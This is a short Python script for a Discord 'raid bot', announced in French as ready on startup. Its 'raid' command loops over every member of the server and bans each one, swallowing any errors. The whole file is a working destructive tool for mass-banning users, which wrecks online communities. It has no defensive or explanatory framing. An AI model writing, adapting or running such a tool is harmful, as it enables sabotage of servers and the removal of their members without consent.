import discord
import asyncio

from discord.ext import commands

bot = commands.Bot(command_prefix='r')


@bot.listen()
async def on_ready():
    print('raid bot prêt')


@bot.command(pass_context = True)
async def raid(ctx):
  for user in ctx.guild.members:
        try:
            await user.ban()
        except:
            pass





bot.run('token')

